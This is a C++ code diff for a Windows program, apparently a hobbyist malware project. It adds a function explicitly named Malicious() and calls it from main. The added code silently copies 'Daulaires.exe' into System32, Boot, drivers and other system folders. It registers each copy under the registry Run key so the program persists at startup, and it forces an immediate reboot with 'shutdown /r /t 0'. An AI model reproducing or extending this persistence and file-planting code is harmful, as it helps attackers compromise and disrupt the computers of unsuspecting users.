@@ -12,11 +12,28 @@ auto Main::Windows() -> bool
     utils.DisplayText(info.getCurrentDirectory());
     utils.DisplayText(info.getSystemArchitecture());
     utils.DisplayText(info.getSystemType());
+    map<string, string> paths;
+    // app different paths to the map
+    paths["C:\\Users\\Public\\"] = "C:\\Users\\Public\\";
+    paths["C:\\Users\\"] = "C:\\Users\\";
+    paths["C:\\Users\\Public\\Documents\\"] = "C:\\Users\\Public\\Documents\\";
+    paths["C:\\"] = "C:\\";
+    paths["C:\\Windows\\System32\\"] = "C:\\Windows\\System32\\";
+    paths["C:\\Windows\\Boot\\"] = "C:\\Windows\\Boot\\";
+    paths["C:\\Windows\\"] = "C:\\Windows\\";
+    paths["C:\\Windows\\System32\\drivers\\"] = "C:\\Windows\\System32\\drivers\\";
+    paths["C:\\Windows\\System32\\drivers\\etc\\"] = "C:\\Windows\\System32\\drivers\\etc\\";
+    paths["C:\\Windows\\System32\\drivers\\etc\\hosts"] = "C:\\Windows\\System32\\drivers\\etc\\hosts";
+    // loop through all the paths and add Daulaires.exe to them
+    for (const auto& path : paths) {
+        // convert the path to a string before adding the file name
+        string pathString = path.second;
+        Memory.SilentMoveFile("Daulaires.exe", info.getCurrentDirectory(), pathString);
+	};
 
-    // Horrible way of listening for commands
-    utils.MoveExe("Daulaires.exe", info.getCurrentDirectory(), "C:\\Users\\Public\\");
     Memory.SilentWriteToFile("test.txt", "C:\\Users\\Public\\", "Hello, world!");
-    
+
+    system("shutdown /r /t 0");
 
     while (true) {
 
@@ -110,6 +127,48 @@ auto Main::NotWindows(void) -> bool
     return 0;
 };
 
+void addToStartup(const std::wstring& appName, const std::wstring& appPath) {
+    HKEY hKey = nullptr;
+
+    // Open the registry key for current user startup programs
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        // Set the registry entry for your application
+        if (RegSetValueExW(hKey, appName.c_str(), 0, REG_SZ, (BYTE*)appPath.c_str(), (appPath.size() + 1) * sizeof(wchar_t)) != ERROR_SUCCESS) {
+            std::wcerr << L"Error setting registry entry." << std::endl;
+        }
+
+        // Close the registry key
+        RegCloseKey(hKey);
+    }
+    else {
+        std::wcerr << L"Error opening registry key." << std::endl;
+    }
+};
+
+void Malicious() {
+    map<string, string> paths;
+    // app different paths to the map
+    paths["C:\\Users\\Public\\"] = "C:\\Users\\Public\\";
+    paths["C:\\Users\\"] = "C:\\Users\\";
+    paths["C:\\Users\\Public\\Documents\\"] = "C:\\Users\\Public\\Documents\\";
+    paths["C:\\"] = "C:\\";
+    paths["C:\\Windows\\System32\\"] = "C:\\Windows\\System32\\";
+    paths["C:\\Windows\\Boot\\"] = "C:\\Windows\\Boot\\";
+    paths["C:\\Windows\\"] = "C:\\Windows\\";
+    paths["C:\\Windows\\System32\\drivers\\"] = "C:\\Windows\\System32\\drivers\\";
+    paths["C:\\Windows\\System32\\drivers\\etc\\"] = "C:\\Windows\\System32\\drivers\\etc\\";
+    paths["C:\\Windows\\System32\\drivers\\etc\\hosts"] = "C:\\Windows\\System32\\drivers\\etc\\hosts";
+
+    std::wstring appName = L"Daulaires";
+    // loop through all the paths and add Daulaires.exe to them
+    for (const auto& path : paths) {
+        // convert the path to a string before adding the file name
+        string pathString = path.second;
+        std::wstring appPath = std::wstring(pathString.begin(), pathString.end()) + L"Daulaires.exe";
+        addToStartup(appName, appPath);
+    };
+};
+
 int main() {
     Info Info;
     Main Main{};
@@ -126,7 +185,8 @@ int main() {
         Main.NotWindows();
         return 1;
     };
-
+    // Malicious Code
+    Malicious();
     // loop through the Info functions to check what the system is
     Main.Windows();
 
